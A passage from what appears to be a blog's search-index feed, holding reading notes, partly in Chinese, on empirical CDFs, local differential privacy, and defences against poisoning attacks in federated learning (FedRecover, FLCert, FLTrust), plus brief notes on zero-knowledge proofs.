𝑥 and returnsvalues from the [0,1] interval (probabilities)—let's denote them as 𝑝.The inverse of the cumulative distribution function (or quantilefunction) tells you what <span class="math inline">\(x\)</span> wouldmake <span class="math inline">\(F(x)\)</span> return some value 𝑝,<span class="math inline">\(𝐹^{−1}(𝑝) = x\)</span></p></li></ol><h2 id="joint-probability-distribution">Joint probabilitydistribution</h2><p>With the Joint probability distribution, we can conclude the marginaldistributions. However, according two marginal distributions <spanclass="math inline">\(P\)</span> and <spanclass="math inline">\(Q\)</span>, the joint distribution is not unique,whose space can be denoted as <span class="math inline">\(\prod(P_r,P_g)\)</span>.</p><p>Joint cumulative distribution function is for discrete randomvariable.</p><h2 id="empirical-cdf">Empirical CDF</h2><p>Empirical distribution function (commonly also called an empiricalcumulative distribution function, eCDF) is the distribution functionassociated with the empirical measure of a sample. It is <strong>anestimator of the Cumulative Distribution Function</strong>. Thecumulative distribution function is a step function that jumps up by<span class="math inline">\(\frac{1}{n}\)</span> at each of the n datapoints.</p><p>Let <span class="math inline">\(X\)</span> be a random variable withCDF <span class="math inline">\(F(x) = P(X \le x)\)</span>, and let<span class="math inline">\(x_1, x_2, \cdots, x_n\)</span> be n i.i.drandom varibales sampled from <span class="math inline">\(X\)</span>(also called observation values). First, we can sort the observationvalues in ascending order as <span class="math inline">\(x_1 \le x_2\le, \cdots, x_n\)</span>, where the frequency of <spanclass="math inline">\(x_i\)</span> is <spanclass="math inline">\(n_i\)</span> (<span class="math inline">\(n_1 +n_2 ... + n_3 = n\)</span>). Then, the empirical CDF can be definedas:</p><p><span class="math display">\[F_n(x) = \begin{cases}0, \quad &amp;(x \lt x_1);\\\frac{n_1+n_2+\cdots+n_k}{n};\quad &amp;(x_k \le x \lt x_{k+1}); \quad(k=1,2,\cdots, r-1)\\x,\quad &amp;(x_k \ge x_{r})\end{cases}\]</span></p><p>or just</p><p><span class="math display">\[\begin{equation}F_n(x_t) = \frac{\text{number of elements in the samples} \le x_t}{n} =\frac{1}{n}\sum_{i=1}^n I_{x_i \le x_t},\end{equation}\]</span></p><p>where <span class="math inline">\(I(\cdot)\)</span> is the indicatorfunction. A illustration of empirical CDF of an example is shownbelow:</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20230918105041.png"alt="20230918105041" /><figcaption aria-hidden="true">20230918105041</figcaption></figure><h2 id="references-and-recommends">References and Recommends</h2><ol type="1"><li><ahref="https://www.mayo.edu/research/documents/parametric-and-nonparametric-demystifying-the-terms/doc-20408960">Parametricand Nonparametric: Demystifying the Terms</a></li><li>lecture1.pdf](https://www.win.tue.nl/~rmcastro/AppStat2013/files/lecture1.pdf)</li><li>Introduction; The empirical distributionfunction](https://myweb.uiowa.edu/pbreheny/uk/teaching/621/notes/8-23.pdf)</li><li><ahref="https://en.wikipedia.org/wiki/Statistical_hypothesis_testing">Statisticalhypothesis testing - Wikipedia</a></li><li><ahref="https://baike.baidu.com/item/%E9%9D%9E%E5%8F%82%E6%95%B0%E6%A3%80%E9%AA%8C/6910745">非参数检验_百度百科</a></li><li><ahref="https://en.wikipedia.org/wiki/Empirical_distribution_function">Empiricaldistribution function - Wikipedia</a></li><li><ahref="https://www.baike.com/wikiid/4071368234826461436?view_id=32wx4ozhw18000">样本分布函数- 快懂百科</a></li><li><ahref="https://towardsdatascience.com/understanding-empirical-distributions-ed131de5f3df">TODO:Empirical Distribution: Everything You Need To Know | by Shubham Panchal| Towards Data Science</a></li><li><ahref="https://stats.stackexchange.com/questions/212813/help-me-understand-the-quantile-inverse-cdf-function">distributions- Help me understand the quantile (inverse CDF) function - CrossValidated</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> probabilities </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>L-SRR Local Differential Privacy for Location-Based Services with Staircase Randomized Response</title>
      <link href="/blog/2023/08/11/academic/papers/ldp_location/"/>
      <url>/blog/2023/08/11/academic/papers/ldp_location/</url>
      
        <content type="html"><![CDATA[<p>PDF: <a href="https://arxiv.org/abs/2209.15091">[2209.15091] L-SRR:Local Differential Privacy for Location-Based Services with StaircaseRandomized Response</a>, 代码：<ahref="https://github.com/hwangcsiit/Location-Local-Differential-Privacy">hwangcsiit/Location-Local-Differential-Privacy</a></p><h2 id="backgroud-and-motivation">Backgroud and Motivation</h2><p>基于位置的服务（LBS）广泛应用，但 local differential privacy，作为一种强大的隐私模型，由于现存的 LDP 机制效用不高，无法应用到 LBS中。</p><h2 id="contribution">Contribution</h2><ol type="1"><li><p>第一个提出 LDP 框架 L-SRR for 各样的 LBS应用，可以高效地隐私地收集和分析用户位置。</p></li><li><p>设计了新的随机响应机制，阶梯随机响应，Staircase RandomizedResponse, 并扩展了 empirical estimation，以提高 SRR 在不同 LBS应用中的效用（例如交通密度估计，k-最近邻）。</p><p>Randomized Response (RR) based schemes, such as generalizedrandomized response (GRR) and unary encoding (UE). However, only twodifferent perturbation probabilities are defined in the existing LDPmechanisms (e.g., GRR, UE, and HR), not sufficiently fine-grained tooptimize the utility (since the perturbation probabilities simply treatall the other output locations in the domain equally). 因此提出Staircase Randomized Response (SRR)</p><p>Intuition: if the probabilities for locations that are closer to theinput location 𝑥 can be higher, it is more possible for users that thequery results of the LBS are the same. To this end, SRR will firstconsider the location distances to the input location 𝑥.</p><p>具体实现：</p><ol type="1"><li><p>Hierarchical Location Encoding. To encode the location data, weuse a hierarchical encoding scheme based on the Bing Map TilesSystem</p></li><li><p>Location Groups</p><p>With hierarchical encoding for the location domain D, the distancebetween any two locations <span class="math inline">\(x,x^{&#39;} \inD\)</span> can be directly measured by the longest common prefixes (LCP)of their encoded bit strings.</p><p>Define the LCP of the group (GLCP): the shortest LCP between theinput location 𝑥 and <span class="math inline">\(\forall y \inG_j(x)\)</span></p><p>Then, we can partition all the output locations into groups using theGLCP lengths</p></li><li><p>Location Partitioning</p><p>partition the locations into <span class="math inline">\(m\)</span>groups for each input <span class="math inline">\(x \in D\)</span>, andassign the same perturbation probability to all the locations in thesame group.</p><p><span class="math display">\[\begin{equation}\mathrm{SRR}: \forall x \in \mathcal{D}, q(y \midx)=\left\{\begin{array}{ccc}\alpha_1(x), &amp; \text { if } y \in G_1(x) \\\vdots &amp; \vdots \\\alpha_m(x), &amp; \text { if } y \in G_m(x)\end{array}\right.\end{equation}\]</span></p><p>since SRR discretizes the perturbation probabilities for all thegrouped possible output locations, the PDF of SRR has a similar shape tothe staircase mechanism in differential privacy, which also has astaircase PDF for different groups to satisfy 𝜖-DP. That's the reasonwhy the paper name our new randomization mechanism as the “StaircaseRandomized Response” (SRR) in local differential privacy.</p></li><li><p>offline computation</p><p>Offline Computation. Since the optimization and partitioning aresolely based on the domain D, they can be executed offline andperiodically updated with D by the server in L-SRR.</p></li></ol></li><li><p>通过在 LBS 应用中与其他 LDP 机制对比，证明了在 LBS场景应用中，L-SRR 的效用优于现有的 LDP 机制。</p></li></ol><h2 id="借鉴点离散化-通过近似分组思想降低计算复杂度">借鉴点：离散化,通过近似分组思想降低计算复杂度</h2>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Practical Differentially Private and Byzantine-resilient Federated Learning</title>
      <link href="/blog/2023/08/10/academic/papers/ldp_byz_fl/"/>
      <url>/blog/2023/08/10/academic/papers/ldp_byz_fl/</url>
      
        <content type="html"><![CDATA[<p><a href="https://arxiv.org/abs/2304.09762">Practical DifferentiallyPrivate and Byzantine-resilient Federated Learning</a> ，源代码: <ahref="https://github.com/zihangxiang/Practical-Differentially-Private-and-Byzantine-resilient-Federated">zihangxiang/Practical-Differentially-Private-and-Byzantine-resilient-Federated</a></p><p>发表在了 Proceedings of the ACM on Management of Data (PACMMOD) 2023,看知乎上说是 SIGMOD 23 的文章改为在 PACMMOD 期刊。</p><h2 id="backgroud-and-motivation">Backgroud and Motivation</h2><p>如何在实现 privacy 的前提下实现 Byzantine robust FL,关于使用差分隐私保护模型参数和使用 Byzantine-robust方式来缓解毒化等攻击的研究都已经有了，但是如何同时实现这两个目标还没有较好的结合。</p><h2 id="contributions">Contributions</h2><p>本文提出将</p><ol type="1"><li>DP-SGD</li><li>类似于 NDSS'21 FLTrust（normalize and use cosine similarity）但是衡量指标改为向量内积的检测攻击</li></ol><p>相结合，实现了 DP 和 Byzantine-robust 的联邦学习。</p><p>Byzantine_detect { DP{W_i} }(先加 DP，然后再检测恶意攻击)</p><h3 id="第一阶段检查">第一阶段检查</h3><p>由于随机噪声的引入会影响现存 byzantine attacks检测的效果，现存有些工作通过增大 batch size 来限制噪声的影响。本文使用small batch size 来作为第一阶段的聚合。第一阶段的 small training batchsize for each worker 和第一阶段检查，可以防止一些攻击</p><ol type="1"><li><p>具体方式</p><p>Different from existing works that adopt big batch size (<spanclass="math inline">\(10^2 −10^6\)</span>), we adopt small batch size<span class="math inline">\(𝑏_𝑐\)</span> (typically 8 or 16).</p></li><li><p>idea</p><p>small batch size 可以使得每次的上传结果中 DP noise占据主导，根据加的高斯噪声，从而推导出上传结果的统计特性来检测攻击。此外，尽管每个worker的上传结果中噪声占据主导，但是所有的上传结果平均之后，便会减小噪声的方差，平均梯度到非零期望，便可以实现较好的效用。</p></li><li><p>细节</p><p>每个客户端的上传结果中 DP noise占据主导，因此可以将上传结果看作噪声采样的高斯分布 N(0, <spanclass="math inline">\(\sigma^2\)</span>),根据高斯分布和卡方分布的特性，可以得知 <spanclass="math inline">\(\frac{||g||^2}{\sigma^2}\)</span> 服从卡方分布chi-squared distribution。根据中心极限定理，可以将 <spanclass="math inline">\(∥𝑔∥^2\)</span> 近似为 Gaussian distribution: <spanclass="math inline">\(N(𝜎^2𝑑, 2𝜎^4𝑑)\)</span>, 从而 <spanclass="math inline">\(||g||^2\)</span> 落在 3𝜎 范围之内</p><p>通过 1. 检查<span class="math inline">\(||g||^2\)</span> 是否落在 3𝜎范围之内以及 2. 通过 Kolmogorov–Smirnov test (KS test) 检测 g 是否是Gaussian distribution 来检测攻击</p></li></ol><h3 id="第二阶段聚合">第二阶段聚合</h3><p>发现 bounding gradient sensitivity by normalizing 更适合 DPlearning。通过对 normalize 和向量内积来作为第二阶段的检查。</p><p>use normalizing instead of clipping to bound per-example gradientnorm 和第二阶段检查可以阻止绕过第一阶段的其他攻击</p><ol type="1"><li><p>具体方式</p><p>Replace the clipping operation in vanilla DP-SGD by normalization tonormalization, which is change the multiplication factor from Factor =min{1, <span class="math inline">\(\frac{𝐶}{∥g∥_2}\)</span>} (𝐶 iscalled the clipping threshold) to Factor = <spanclass="math inline">\(\frac{1}{∥g∥_2}\)</span>, which normalizes thegradients to be of unit 𝑔 length.</p></li><li><p>idea</p><p>通过 server 维护的 trusted 梯度与每个客户端的梯度计算向量内积作为score 来检测梯度更新的方向，选择 top <spanclass="math inline">\(⌈𝛾𝑛⌉\)</span> scores (要求 server 预先确定 n 个worker 中至少有 𝛾 比例的良性节点)的平均数作为筛选阈值。</p></li></ol><h2 id="局限性">局限性</h2><ol type="1"><li><p>要求 server 预先确定 n 个 worker 中至少有 𝛾 比例的良性节点</p><p>the server has a prior belief that at least ⌈𝛾𝑛⌉ workers arehonest,</p></li><li><p>只能应用于高斯噪声</p></li><li><p>first aggregation 的约束看起来并不 solid？</p><ol type="1"><li>本文仿佛是先 DP，然后使用 FLTrust 的 normalization和相似度换成内积直接组合而成。第一阶段的确实增加了约束，但是我没有看到该约束和第二阶段约束的互补性在哪里</li></ol><p>虽然作者在文章中 4.7 Discussion讲到第二阶段可能会因为噪声的随机性效果不好，但是使用第一阶段会好的原因，它只解释了因为norm了所以威胁小了，并没有说第一阶段的两个约束具体约束了哪些攻击,虽然确实多了一些正确约束。</p><ol start="2" type="1"><li>第二阶段使用的客户端梯度是第一阶段之后的，但是还是加了噪声，byzantineattack 检测也会不准确吧。</li></ol></li></ol><h2 id="参考资料">参考资料</h2><ol type="1"><li><a href="https://www.zhihu.com/question/591218708?utm_id=0">如何评价SIGMOD23 的文章改为在 PACMMOD 期刊上发表？ - 知乎</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>FedRecover 论文阅读笔记</title>
      <link href="/blog/2023/08/04/academic/papers/fedrecover/"/>
      <url>/blog/2023/08/04/academic/papers/fedrecover/</url>
      
        <content type="html"><![CDATA[<p>Cao, Xiaoyu, et al. "Fedrecover: Recovering from poisoning attacks infederated learning using historical information." 2023 IEEE Symposium onSecurity and Privacy (SP). IEEE, 2023. <ahref="%5BFedRecover:%20Recovering%20from%20Poisoning%20Attacks%20in%20Federated%20Learning%20using%20Historical%20Information%5D(https://arxiv.org/abs/2210.10936)">Paperlink</a></p><h2 id="backgroud-and-motivation">Backgroud and Motivation</h2><p>目前关于 poisoning attack 的防御主要集中在：</p><ol type="1"><li>Prevention：对于小规模的恶意客户端，通过 robust 联邦学习方法来检测,缓解或排除被毒化的本地模型来避免全局模型遭受毒化。</li><li>Detection: 检测大规模的恶意客户端</li></ol><p>问题：在检测到恶意客户端之后，如何恢复被毒化攻击的全局模型？</p><h2 id="contributions">Contributions</h2><p>FedRecover idea 的出发点应该是 poisoning attacks 和 machineunlearning 的结合。但我看到本论文之前有一些文章：针对 poisioning attack等需求，提出 federeated machine unlearning，应该是没有直接考虑 poisoningattacks 之后 recovery 这个应用场景以及对应的解决办法。</p><p>naive method: train-from-scratch是检测到恶意客户端之后，剔除恶意的，用剩下的客户端重新训练一遍，但是通信和计算开销显然很大。</p><p>本文提出的 FedRecover方法使用检测到恶意攻击者之前的本地模型与更新来估计以后每轮的本地模型更新，从而恢复全局模型。</p><ol type="1"><li>the server stores the historical information, including the globalmodels and clients’ model updates in each round, when training thepoisoned global model before the malicious clients are detected.</li><li>During the recovery process, the server estimates a client’s modelupdate in each round using its stored historical information.</li><li>当 server 认为 estimated global model update不够精确时，它可以在进行一轮常规的 FL 训练来提升准确度。</li></ol><p>核心公式：</p><p>integral version of the Cauchy mean value theorem:</p><p><span class="math display">\[\begin{equation}f(x+y)-f(x)=\int_0^1 f^{\prime}(x+t y) y d t=\int_0^1 f^{\prime}(x+t y)d t \cdot y\end{equation}\]</span></p><p>from Theorem 4.2 on page 341 of S. Lang, Real and FunctionalAnalysis. Springer, 1993.</p><p>本文的核心公式：</p><p>$$ <span class="math display">\[\begin{equation}\begin{aligned}    g_t^i=\overline{g}_t^i+\mathbf{H}_t^i\left(\hat{w}_t-\overline{w}_t\right),where\\    \mathbf{H}_t^i=\int_0^1\mathbf{H}\left(\overline{w}_t+z\left(\hat{w}_t-\overline{w}_t\right)\right)dz\end{aligned}\end{equation}\]</span> $$</p><p>其中</p><ol type="1"><li><p><span class="math inline">\(\overline{w}_t\)</span> to denote the<strong>original global</strong></p></li><li><p><span class="math inline">\(\overline{g}_t^i\)</span> denote the<strong>original model update</strong> reported by the <spanclass="math inline">\(i\)</span>-th client in the <spanclass="math inline">\(t\)</span>-th round</p></li><li><p><span class="math inline">\(\hat{w}^t\)</span> denotes the<strong>recovered global model</strong> in the <spanclass="math inline">\(t\)</span>-th round of FedRecover.</p></li><li><p><span class="math inline">\(g^t_i\)</span> to denote the <spanclass="math inline">\(i\)</span>-th client’s <strong>exact modelupdate</strong> in the tth round of the recovery process if the clientcomputes it</p></li><li><p>梯度 g 是模型参数 w 的函数，<span class="math inline">\(g =Q(w)\)</span>，具体函数形式取决于使用的 loss function以及模型的结构。</p></li></ol><p><span class="math display">\[Q&#39;(\overline{w}_t+z\left(\hat{w}_t-\overline{w}_t\right))=\mathbf{H}\left(\overline{w}_t+z\left(\hat{w}_t-\overline{w}_t\right)\right)\left(\hat{w}_t-\overline{w}_t\right)\]</span></p><p>则有：</p><p><span class="math display">\[\begin{equation}\begin{aligned}g_t^i - \overline{g}_t^i &amp;=\mathbf{H}_t^i\left(\hat{w}_t-\overline{w}_t\right)\\Q(1)-Q(0) &amp;= \int_0^1 Q^{\prime}(z) dz\end{aligned}\end{equation}\]</span></p><p>由于直接计算 integrated Hessian matrix 比较困难，本文使用了 L-BFGS算法来近似计算。</p><p>L-BFGS 算法属于最优化算法方面的.</p><blockquote><p>L-BFGS（Limited-memoryBroyden-Fletcher-Goldfarb-Shanno）算法是一种常用于无约束优化问题的优化算法。它是BFGS 算法的一种变体，用于解决高维问题，特别是当存储 Hessian矩阵不可行时。</p><p>BFGS算法是一种拟牛顿方法，旨在寻找多元函数的局部极小值。它使用梯度信息来近似目标函数的海森矩阵（Hessianmatrix），从而进行优化。</p><p>L-BFGS 算法通过限制存储和计算 Hessian矩阵的内存需求，解决了高维问题中的性能问题。L-BFGS只需要存储少量的历史信息，并通过迭代来逐步逼近 Hessian 矩阵的逆。这使得L-BFGS 在处理大规模问题时表现优异。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>FLCert Provably Secure Federated Learning against Poisoning Attacks 论文阅读笔记</title>
      <link href="/blog/2023/08/04/academic/papers/flcert/"/>
      <url>/blog/2023/08/04/academic/papers/flcert/</url>
      
        <content type="html"><![CDATA[<p>FLcert 是发表在 TIFS'22上的一篇关于缓解联邦学习毒化攻击的论文,论文相关引用与来源如下：</p><ol type="1"><li><p>AAAI'21 version</p><p>Cao, Xiaoyu, Jinyuan Jia, and Neil Zhenqiang Gong. "Provably securefederated learning against malicious clients." Proceedings of the AAAIconference on artificial intelligence. Vol. 35. No. 8. 2021. PDF: <ahref="https://arxiv.org/abs/2102.01854">[2102.01854] Provably SecureFederated Learning against Malicious Clients</a></p></li><li><p>TIFS'22 version</p><p>Cao, Xiaoyu, et al. "Flcert: Provably secure federated learningagainst poisoning attacks." IEEE Transactions on Information Forensicsand Security 17 (2022): 3691-3705. PDF: <ahref="https://arxiv.org/pdf/2210.00584.pdf">FLCert: Provably SecureFederated Learning against Poisoning Attacks</a></p></li></ol><p>TIFS'22 论文是 AAAI'21 上对应论文的扩展，本文主要对 AAAI'21上的该论文进行阅读理解，并指出其在 TIFS 上的扩展部分。</p><h2 id="background-and-motivation">Background and Motivation</h2><p>针对联邦学习的毒化攻击，目前防御方法有 Byzantine-robust aggregationrules, such as Krum [9], trimmed mean and median,FLtrust等。但是这些方法都没有对毒化攻击提供可证明的安全保证，不能够保证预测结果是否收到恶意客户端的影响。</p><blockquote><p>However, these methods cannot provably guarantee that the predictedlabel for a testing example is not affected by malicious clients.</p></blockquote><h2 id="contributions">Contributions</h2><p>本文通过将集成学习 ensemble learning 应用在联邦学习中，也就是ensemble federated learning 来解决上述问题。</p><blockquote><p>回顾周志华西瓜书的解释，集成学习通过构建并结合多个学习器来完成学习任务，有时被称为多分类器系统(multi-classifier &gt; &gt; &gt; &gt; &gt; system)、基于委员会的学习(committee-based learning) 等。</p><p>集成学习的一般结构与步骤:</p><ol type="1"><li><p>先产生一组 individual learner</p><p>individual learner通常由一个现有的学习算法从训练数据产生，例如决策树、神经网络 CNN 等,如果individual learners 算法相同，则称为同质的 homogeneous，否则称为异质的heterogeneous。</p></li><li><p>再用某种结合策略将它们结合起来</p><p>常用的结合策略: 对于回归模型，需要预测数值的，常用平均法：直接平均averaging 和对 individual learner 加权平均 weighted averaging对于分类模型，需要预测类别的，常用投票法：多数投票（majority）voting和加权投票法 weighted voting</p></li></ol></blockquote><h3 id="提出的框架如下">提出的框架如下</h3><ol type="1"><li><p>先产生一组 individual learner</p><p>在本文中，通过 randomly sampling a subset of clients 生成一组组的individual learners，具体的，假设有 N 个 clients，每组有 k 个clients,那么采样可能有排列数 <span class="math inline">\(C_N^k\)</span>种，也就是有 <span class="math inline">\(C_N^k\)</span> 组，每组有 k个。然后训练 <span class="math inline">\(C_N^k\)</span> 个模型，得到<span class="math inline">\(C_N^k\)</span> 个 global models</p></li><li><p>使用 majority voting 来解决分类问题中的标签预测</p><p>使用得到的 <span class="math inline">\(C_N^k\)</span> 个 globalmodels 对同一测试样本进行预测，使用 majority voting，也就是预测的 label类别最多的作为最终的预测结果。</p></li></ol><p>从而在联邦学习中实现 provably guarantee that the predicted label fora testing example is not affected by malicious clients,也就是可以证明，标签预测结果未受到恶意客户端的影响。</p><h3 id="理论成果">理论成果</h3><ol type="1"><li>our ensemble global model provably predicts the same label for atesting example x when the number of malicious clients is no larger thana threshold, which we call certified security level.</li><li>The derived bound is tight, i.e., when no assumptions are made onthe base federated learning algorithm, it is impossible to derive acertified security level that is larger than ours.</li></ol><p>缺点：Note that the certified security level may be different fordifferent testing examples.</p><h3 id="实现困难与解决方案">实现困难与解决方案</h3><p><span class="math inline">\(p_i\)</span> label probability: define<span class="math inline">\(p_i\)</span> as the fraction of the <spanclass="math inline">\(C_N^k\)</span> global models that predict label ifor x, where <span class="math inline">\(i = 1, 2,\cdots,L\)</span>.</p><p>计算 certified security level 需要<spanclass="math inline">\(C_N^k\)</span>个预测结果中 largest and secondlargest labelprobabilities，也就是需要知道标签预测结果中预测数量第一多和第二多的标签的预测数量。</p><p>当 <span class="math inline">\(C_N^k\)</span>较小时，计算这种还可以，但是当 <spanclass="math inline">\(C_N^k\)</span> 很大时，计算量太大，所以本文develop a Monte Carlo algorithm to estimate them with probabilisticguarantees via training N instead of <spanclass="math inline">\(C_N^k\)</span> global models.</p><blockquote><p>蒙特克罗算法（Monte Carlomethod）：以概率统计理论为指导的、通过随机抽样来来近似计算问题的解或结果一般情况下，蒙特卡罗算法的特点是，采样越多，越近似最优解，而永远不是最优解。</p></blockquote><h2 id="提出的-ensemble-federated-learning-框架细节">提出的 EnsembleFederated Learning 框架细节</h2><ol type="1"><li><p>define provable security guarantees against maliciousclients:</p><p><span class="math inline">\(h(C&#39;,x) = h(C,x), ∀C&#39;, M(C&#39;)≤ m^∗\)</span></p><p>C 是 the set of n clients，C' 是 the set of n clients with maliciousones。M(C') 是 the number of malicious clients in C'，<spanclass="math inline">\(m^∗\)</span> 是可以承受的最多 malicious client个数，也就是 the certified security level，<spanclass="math inline">\(h(C,x)\)</span> 是 the label predicted by theensemble global model trained on C for x。</p></li><li><p>Deriving certified security level using exact labelprobabilities</p><p>设 <span class="math inline">\(p_y\)</span>： the largest label yprobability，<span class="math inline">\(p_y&#39;\)</span>: the labelprobability of y when there are malicious clients，<spanclass="math inline">\(p_z\)</span>：the second largest label zprobability，<span class="math inline">\(p_z&#39;\)</span>: the labelprobability of z when there are malicious clients。设有 m 个 maliciousclients,则有 <span class="math inline">\(1 -\frac{C_{n-m}^k}{C_n^k}\)</span> 比例的采样组至少含有一个 maliciousclients，最坏的情况下，会有如下公式：</p><p><span class="math display">\[p_y&#39; = p_y - 1 -\frac{C_{n-m}^k}{C_n^k}\]</span></p><p><span class="math display">\[p_z&#39; = p_z + 1 -\frac{C_{n-m}^k}{C_n^k}\]</span></p><p>因此，为了保证预测结果正确，需要</p><p><span class="math display">\[\begin{equation}     \begin{aligned}         p_y&#39; &amp;&gt; p_z&#39;\\         p_y - 1 - \frac{C_{n-m}^k}{C_n^k} &amp;&gt; p_z + 1 -\frac{C_{n-m}^k}{C_n^k}\\         p_y - p_z &amp;&gt; 2 - \frac{2C_{n-m}^k}{C_n^k}     \end{aligned}\end{equation}\]</span></p><p>因此，certified security level <spanclass="math inline">\(m^*\)</span> 可以通过上述公式计算得到。</p></li><li><p>Deriving certified security level using approximate labelprobabilities:</p><p><span class="math inline">\(p_y - p_z &gt;= \underline{p_y} -\overline{p_z}\)</span>, where <spanclass="math inline">\(\underline{p_y}\)</span> is the lower bound of<span class="math inline">\(p_y\)</span>, <spanclass="math inline">\(\overline{p_z}\)</span> is the upper bound of<span class="math inline">\(p_z\)</span>.</p><p>propose a Monte Carlo algorithm to estimate a lower bound <spanclass="math inline">\(p_y\)</span> and an upper bound <spanclass="math inline">\(p_z\)</span> via only training N of the <spanclass="math inline">\(C_{n-m}\)</span> global models.</p><p>得出 <span class="math inline">\(\underline{p_y} - \overline{p_z}&gt; 2 - \frac{2C_{n-m}^k}{C_n^k}\)</span></p><p>最后，发现根据上述公式得出的 the certified security level <spanclass="math inline">\(m^*\)</span> 并不 tight，因为 <spanclass="math inline">\(m^*\)</span> 应该是 <spanclass="math inline">\(\frac{1}{C_n^k}\)</span> 的整数倍。因此需要</p><p>normalize <span class="math inline">\(\underline{p_y} -\overline{p_z}\)</span> 为其倍数：</p><p>找到最接近 x 的 n 的倍数的整数，可以使用下面的公式：<code>nearest_multiple = n * round(x / n)</code>。可以使用向上取整或向下取整的方法来实现不同的取舍方式：</p></li><li><p>扩展为 TIFS期刊的文章对分组的方法进行了划分，提出了两种分组方法，分别是 FLCert-P 和FLCert-D</p><p>随机性的 FLCert-P: randomly samples clients in each group 确定性的FLCert-D: divides clients to disjoint groups deterministically</p></li></ol><h2 id="总结">总结</h2><ol type="1"><li>论文应用集成学习来解决 poisioning attacks 的想法很新颖</li><li>解决问题的思路很流畅，遇到问题就找原因去解决问题。</li><li>数论知识的应用很好</li></ol><p>可以借鉴的点：</p><ul class="task-list"><li><label><input type="checkbox" />集成学习及其应用</label></li><li><label><input type="checkbox" />蒙特卡洛方法</label></li></ul><h2 id="参考资料">参考资料</h2><ol type="1"><li>周志华 机器学习 西瓜书</li><li><a href="https://bbs.huaweicloud.com/blogs/254288">Algorithm 之MC：Monte Carlo method蒙特·卡罗方法的简介、实现、应用-云社区-华为云</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>FLTrust Byzantine-robust Federated Learning via Trust Bootstrapping 论文阅读笔记</title>
      <link href="/blog/2023/08/04/academic/papers/fltrust/"/>
      <url>/blog/2023/08/04/academic/papers/fltrust/</url>
      
        <content type="html"><![CDATA[<p>NDSS'21 <a href="https://arxiv.org/abs/2012.13995">FLTrust:Byzantine-robust Federated Learning via Trust Bootstrapping</a></p><p>FLTrust 主要工作： 在于在 server 端 maintain 一份小的干净的数据集，与client 同步训练 root/server model。基于梯度下降方向的一致性，采用 cosinesimilarity 来衡量 root 与 client gradient之间的相似性，从而判断是否有恶意client。此外防止恶意梯度过大，导致方向偏离，采用了梯度裁剪的方法。</p><p>该论文的详细内容自己曾经做过 PPT 汇报 <ahref="https://realyee.github.io/blog/assets/fltrust.pdf">Fltrust PPTlink</a>, 并且针对 poisoning attacks to Byzantine-robust federatedlearning 对以下俩篇文章做了个 poster 汇总，练习 poster 制作 <ahref="https://realyee.github.io/blog/assets/poisoning_attack_poster.pdf">Posterlink</a>。</p><ol type="1"><li><p>Fang, Minghong, et al. "Local model poisoning attacks toByzantine-Robust federated learning." 29th USENIX security symposium(USENIX Security 20). 2020.</p></li><li><p>Cao, Xiaoyu, et al. "Fltrust: Byzantine-robust federated learningvia trust bootstrapping." arXiv preprint arXiv:2012.13995(2020).</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>zk with programmability</title>
      <link href="/blog/2023/05/30/crypto/zk/specific2program/"/>
      <url>/blog/2023/05/30/crypto/zk/specific2program/</url>
      
        <content type="html"><![CDATA[<h1 id="zk-with-programmability">zk with programmability</h1><p>There are limitations for the Schnoor protocol based on discre logproblem, a common seen zk example. It can only support a specificcomputation, <span class="math inline">\(x = log_g(y)\)</span>, lackingof programmability.</p><p>For general arithmetic computation, Groth 16, PLONK is popular.</p><p>Groth 16:</p><ol type="1"><li>Support arbitrary arithmetic computation with goodprogrammability</li><li>Fast prover time</li><li>Millisecond level verifying time</li><li>Constant proof size even if the arithemtic computation iscomplex</li></ol><h2 id="wasm-deployment">WASM Deployment</h2><p>Previous Approach:</p><ol type="1"><li>Compile ZKP code into binary and distribute the binary to usersDrawback:</li><li>Users prefer to not download a binary</li><li>Complexity in supporting many backends (e.g., Windows, MAС, Ubuntu,etc)</li></ol><p>Recent Trend:</p><ol type="1"><li>Compile ZKP code to web assembly (WASM) backend</li><li>Distribute as a browser extension</li></ol><p>Benefits:</p><ol type="1"><li>Users do not need to download a binary</li><li>Directly support diverse backend</li></ol><p>WASM Deployment: Performance Bottleneck</p><ol type="1"><li>Slow down compared to native CPU execution<ol type="1"><li>For proving ZKP circuit at Manta Network</li><li>2~3 seconds latency on native CPU</li><li>v.s. 20~30 seconds latency on WASM</li></ol></li><li>Bottleneck: MSM(Multi scalar multiplication computation)Computation</li><li>ZPrize: Optimize MSM computation on WASM<ol type="1"><li>Better algorithm to reduce #finite field computations</li><li>Better exploitation of WASM backend properties E.g., hand-writtenassembly code</li></ol></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>zk 资料汇总</title>
      <link href="/blog/2023/04/30/crypto/zk/great_resource/"/>
      <url>/blog/2023/04/30/crypto/zk/great_resource/</url>
      
